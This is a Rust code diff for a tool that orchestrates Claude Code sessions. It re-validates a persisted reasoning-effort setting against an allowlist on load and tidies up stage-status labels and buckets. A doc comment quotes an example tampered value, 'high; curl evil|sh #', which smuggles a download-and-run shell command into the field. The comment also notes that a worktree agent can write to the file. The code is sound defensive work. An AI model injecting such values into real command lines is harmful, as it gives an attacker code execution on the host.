@@ -1,8 +1,9 @@
 use chrono::{DateTime, Utc};
-use serde::{Deserialize, Serialize};
+use serde::{Deserialize, Deserializer, Serialize};
 use serde_json::Value;
 
 use crate::models::failure::FailureInfo;
+use crate::plan::schema::ALLOWED_REASONING_EFFORTS;
 
 /// Type of stage for specialized handling.
 ///
@@ -284,8 +285,14 @@ pub struct Stage {
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub model: Option<String>,
     /// Reasoning effort override for this stage (e.g., "low", "medium", "high", "max")
-    /// When set, Claude Code sessions for this stage use this effort level
-    #[serde(default, skip_serializing_if = "Option::is_none")]
+    /// When set, Claude Code sessions for this stage use this effort level.
+    /// Re-validated against `ALLOWED_REASONING_EFFORTS` on load — an invalid value
+    /// persisted to disk is dropped to `None` rather than reaching the spawn command.
+    #[serde(
+        default,
+        skip_serializing_if = "Option::is_none",
+        deserialize_with = "deserialize_persisted_reasoning_effort"
+    )]
     pub reasoning_effort: Option<String>,
     /// Whether the monitor has flagged this stage's session as possibly stuck.
     /// Derived at read time from `.work/monitor/soft-signals.jsonl`; never persisted
@@ -378,6 +385,28 @@ pub enum StageStatus {
     /// .work/disputes/<stage>/<n>/.
     #[serde(rename = "needs-adjudication")]
     NeedsAdjudication,
+}
+
+/// Coarse classification of a [`StageStatus`] into one of four display/summary
+/// buckets.
+///
+/// This is the single source of truth for the executing/pending/completed/blocked
+/// categorization that both the CLI status collector and the daemon status
+/// responder need. Those two used to keep independently hand-synced match blocks
+/// (the "matching CLI semantics" comment was the tell); they now both route
+/// through [`StageStatus::bucket`].
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum StatusBucket {
+    /// A session is (or should be) actively working: `Executing`, plus the
+    /// active-attention handoff/input states the daemon counts as ongoing work.
+    Executing,
+    /// Not yet started, waiting in the scheduler: `WaitingForDeps`, `Queued`.
+    Pending,
+    /// Terminal success-ish: `Completed`, `Skipped`.
+    Completed,
+    /// Stopped and needing attention: `Blocked`, the merge-failure states, and the
+    /// review/adjudication states.
+    Blocked,
 }
 
 impl std::fmt::Display for StageStatus {
@@ -512,7 +541,13 @@ impl StageStatus {
         style
     }
 
-    /// Returns a short label for this status
+    /// Returns the authoritative short label for this status.
+    ///
+    /// This is the single source of truth for the compact status label used by
+    /// every renderer (status summary, completion table, TUI). Renderers MUST
+    /// call this rather than hand-rolling their own match — past divergence
+    /// (`"MergeErr"` here vs `"MergeBlk"` in two renderers) is exactly the bug
+    /// this consolidation prevents.
     pub fn label(&self) -> &'static str {
         match self {
             Self::Completed => "Completed",
@@ -525,9 +560,67 @@ impl StageStatus {
             Self::Skipped => "Skipped",
             Self::MergeConflict => "Conflict",
             Self::CompletedWithFailures => "Failed",
-            Self::MergeBlocked => "MergeErr",
+            Self::MergeBlocked => "MergeBlk",
             Self::NeedsHumanReview => "Review",
             Self::NeedsAdjudication => "Adjudicate",
+        }
+    }
+
+    /// Classify this status into a coarse [`StatusBucket`].
+    ///
+    /// The mapping matches the established daemon/CLI semantics:
+    /// - `NeedsHandoff` and `WaitingForInput` are **Executing** — they are active
+    ///   states where work is ongoing (per the existing daemon comment at
+    ///   `daemon/server/status.rs`: "NeedsHandoff and WaitingForInput are active
+    ///   states where work is ongoing, so they belong in executing").
+    /// - `Skipped` is grouped with `Completed` (terminal, not blocked).
+    /// - All merge-failure and review/adjudication states are **Blocked** (stopped,
+    ///   needing attention).
+    pub fn bucket(&self) -> StatusBucket {
+        match self {
+            Self::Executing | Self::NeedsHandoff | Self::WaitingForInput => StatusBucket::Executing,
+            Self::WaitingForDeps | Self::Queued => StatusBucket::Pending,
+            Self::Completed | Self::Skipped => StatusBucket::Completed,
+            Self::Blocked
+            | Self::MergeConflict
+            | Self::CompletedWithFailures
+            | Self::MergeBlocked
+            | Self::NeedsHumanReview
+            | Self::NeedsAdjudication => StatusBucket::Blocked,
+        }
+    }
+}
+
+/// Serde deserializer for [`Stage::reasoning_effort`] read back from disk.
+///
+/// `StageDefinition` (plan parse time) rejects an out-of-allowlist effort with a
+/// hard error, but a persisted `Stage` is re-read from `.work/stages/<id>.md` on
+/// every daemon restart, and that file is writable by a worktree agent. Without
+/// re-validation here, a tampered `reasoning_effort: "high; curl evil|sh #"` would
+/// survive reload and be concatenated into the spawn command line.
+///
+/// Unlike the plan-parse deserializer, this one does **not** fail the load on an
+/// invalid value (that would brick the whole daemon over one bad stage file).
+/// Instead it neutralizes the field to `None` (logging at `tracing::error!`), so
+/// `Stage::effective_reasoning_effort` falls back to the safe stage-type default.
+fn deserialize_persisted_reasoning_effort<'de, D>(
+    deserializer: D,
+) -> Result<Option<String>, D::Error>
+where
+    D: Deserializer<'de>,
+{
+    let opt = <Option<String>>::deserialize(deserializer)?;
+    match opt {
+        None => Ok(None),
+        Some(s) if ALLOWED_REASONING_EFFORTS.contains(&s.as_str()) => Ok(Some(s)),
+        Some(invalid) => {
+            tracing::error!(
+                invalid_reasoning_effort = %invalid,
+                allowed = %ALLOWED_REASONING_EFFORTS.join(", "),
+                "Persisted stage reasoning_effort failed allowlist re-validation on load; \
+                 dropping to None and falling back to the stage-type default"
+            );
+            Ok(None)
         }
     }
 }
